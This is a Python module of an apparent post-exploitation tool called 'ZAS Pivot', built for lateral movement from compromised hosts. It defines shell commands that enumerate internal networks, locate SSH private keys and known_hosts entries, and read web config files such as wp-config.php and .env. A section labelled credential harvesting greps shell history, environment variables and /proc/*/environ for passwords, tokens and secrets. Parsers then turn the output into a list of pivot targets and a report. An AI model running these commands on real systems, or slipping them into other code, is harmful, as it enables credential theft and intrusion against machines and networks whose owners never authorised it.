"""
ZAS Pivot — Lateral movement and internal network discovery from compromised hosts.
Discovers internal hosts, SSH keys, and pivot points.
"""

import re
import json


# ─── Pivot Commands ────────────────────────────────────────────────────────────

PIVOT_COMMANDS = {
    "network_discovery": [
        ("internal_ips", "ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}'"),
        ("arp_table", "arp -a 2>/dev/null || ip neigh show 2>/dev/null"),
        ("routes", "ip route 2>/dev/null || route -n 2>/dev/null"),
        ("dns_servers", "cat /etc/resolv.conf 2>/dev/null | grep nameserver"),
        ("hosts_file", "cat /etc/hosts 2>/dev/null | grep -v '^#' | grep -v '^$'"),
    ],
    "ssh_discovery": [
        ("ssh_keys", "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null"),
        ("ssh_config", "cat /root/.ssh/config /home/*/.ssh/config 2>/dev/null"),
        ("known_hosts", "cat /root/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null | awk '{print $1}'"),
        ("ssh_auth_log", "cat /var/log/auth.log 2>/dev/null | grep 'Accepted' | tail -20"),
    ],
    "service_discovery": [
        ("listening_ports", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
        ("running_services", "systemctl list-units --type=service --state=running 2>/dev/null | head -20"),
        ("docker_containers", "docker ps 2>/dev/null"),
        ("docker_networks", "docker network ls 2>/dev/null"),
    ],
    "credential_harvest": [
        ("bash_history", "cat /root/.bash_history /home/*/.bash_history 2>/dev/null | grep -iE 'ssh|scp|mysql|psql|curl.*-u|wget.*--password' | tail -20"),
        ("env_vars", "env 2>/dev/null | grep -iE 'pass|key|secret|token|auth'"),
        ("process_env", "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'pass|key|secret|token' | head -20"),
    ],
    "web_discovery": [
        ("web_roots", "find /var/www -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' 2>/dev/null"),
        ("nginx_configs", "cat /etc/nginx/sites-enabled/* 2>/dev/null | grep -E 'server_name|proxy_pass|upstream' | head -20"),
        ("apache_configs", "cat /etc/apache2/sites-enabled/* 2>/dev/null | grep -E 'ServerName|ProxyPass' | head -20"),
    ],
}


def parse_pivot_output(category, command_name, output):
    """Parse pivot command output for useful information.
    
    Args:
        category: command category
        command_name: specific command name
        output: raw shell output
    
    Returns:
        dict with parsed results
    """
    result = {"raw": output, "parsed": []}
    
    if not output or "permission denied" in output.lower():
        return result
    
    if category == "network_discovery":
        if command_name == "internal_ips":
            for m in re.finditer(r'(\d+\.\d+\.\d+\.\d+)/(\d+)', output):
                result["parsed"].append({
                    "ip": m.group(1),
                    "cidr": m.group(2),
                    "type": "internal_ip",
                })
        
        elif command_name == "arp_table":
            for m in re.finditer(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-f:]+)', output):
                result["parsed"].append({
                    "ip": m.group(1),
                    "mac": m.group(2),
                    "type": "arp_entry",
                })
        
        elif command_name == "hosts_file":
            for line in output.split("\n"):
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split()
                    if len(parts) >= 2:
                        result["parsed"].append({
                            "ip": parts[0],
                            "hostname": parts[1],
                            "type": "hosts_entry",
                        })
    
    elif category == "ssh_discovery":
        if command_name == "known_hosts":
            for line in output.split("\n"):
                line = line.strip()
                if line and "," in line:
                    host = line.split(",")[0]
                    result["parsed"].append({
                        "host": host,
                        "type": "known_host",
                    })
        
        elif command_name == "ssh_keys":
            for line in output.split("\n"):
                line = line.strip()
                if line and ("id_rsa" in line or "id_ecdsa" in line or "id_ed25519" in line):
                    result["parsed"].append({
                        "path": line,
                        "type": "ssh_key",
                    })
    
    elif category == "service_discovery":
        if command_name == "listening_ports":
            for line in output.split("\n"):
                if "LISTEN" in line:
                    parts = line.split()
                    for part in parts:
                        if ":" in part and re.match(r'\d+\.\d+\.\d+\.\d+:\d+', part):
                            ip, port = part.rsplit(":", 1)
                            result["parsed"].append({
                                "ip": ip,
                                "port": int(port),
                                "type": "listening_port",
                            })
        
        elif command_name == "docker_containers":
            for line in output.split("\n")[1:]:  # Skip header
                parts = line.split()
                if len(parts) >= 2:
                    result["parsed"].append({
                        "container_id": parts[0],
                        "image": parts[1],
                        "type": "docker_container",
                    })
    
    return result


def generate_pivot_targets(pivot_results):
    """Generate list of potential pivot targets from discovery results.
    
    Args:
        pivot_results: dict of parsed pivot results
    
    Returns:
        list of target dicts with ip, port, type, confidence
    """
    targets = []
    seen = set()
    
    for category, commands in pivot_results.items():
        for cmd_name, result in commands.items():
            for item in result.get("parsed", []):
                if item.get("type") == "internal_ip":
                    ip = item["ip"]
                    if ip not in seen and ip != "127.0.0.1":
                        seen.add(ip)
                        targets.append({
                            "ip": ip,
                            "port": None,
                            "type": "internal_host",
                            "confidence": "high",
                            "source": f"{category}/{cmd_name}",
                        })
                
                elif item.get("type") == "arp_entry":
                    ip = item["ip"]
                    if ip not in seen:
                        seen.add(ip)
                        targets.append({
                            "ip": ip,
                            "port": None,
                            "type": "arp_host",
                            "confidence": "medium",
                            "source": f"{category}/{cmd_name}",
                        })
                
                elif item.get("type") == "listening_port":
                    ip = item.get("ip", "0.0.0.0")
                    port = item["port"]
                    key = f"{ip}:{port}"
                    if key not in seen:
                        seen.add(key)
                        targets.append({
                            "ip": ip,
                            "port": port,
                            "type": "service",
                            "confidence": "high",
                            "source": f"{category}/{cmd_name}",
                        })
                
                elif item.get("type") == "known_host":
                    host = item["host"]
                    if host not in seen:
                        seen.add(host)
                        targets.append({
                            "ip": host,
                            "port": None,
                            "type": "known_host",
                            "confidence": "medium",
                            "source": f"{category}/{cmd_name}",
                        })
    
    return targets


def format_pivot_report(pivot_results, targets):
    """Format pivot results into a readable report.
    
    Args:
        pivot_results: dict of parsed pivot results
        targets: list of pivot targets
    
    Returns:
        str: formatted report
    """
    lines = ["=" * 60]
    lines.append("  PIVOT / LATERAL MOVEMENT REPORT")
    lines.append("=" * 60)
    lines.append("")
    
    # Network info
    lines.append("  [NETWORK]")
    for cmd_name, result in pivot_results.get("network_discovery", {}).items():
        if result.get("parsed"):
            lines.append(f"    {cmd_name}:")
            for item in result["parsed"][:5]:
                lines.append(f"      - {item}")
    lines.append("")
    
    # SSH info
    lines.append("  [SSH]")
    for cmd_name, result in pivot_results.get("ssh_discovery", {}).items():
        if result.get("parsed"):
            lines.append(f"    {cmd_name}:")
            for item in result["parsed"][:5]:
                lines.append(f"      - {item}")
    lines.append("")
    
    # Services
    lines.append("  [SERVICES]")
    for cmd_name, result in pivot_results.get("service_discovery", {}).items():
        if result.get("parsed"):
            lines.append(f"    {cmd_name}:")
            for item in result["parsed"][:5]:
                lines.append(f"      - {item}")
    lines.append("")
    
    # Targets
    lines.append("  [PIVOT TARGETS]")
    if targets:
        for t in targets[:20]:
            port_str = f":{t['port']}" if t.get('port') else ""
            lines.append(f"    {t['ip']}{port_str} ({t['type']}, {t['confidence']})")
    else:
        lines.append("    No pivot targets found")
    lines.append("")
    
    lines.append("=" * 60)
    lines.append(f"  Total targets: {len(targets)}")
    lines.append("=" * 60)
    
    return "\n".join(lines)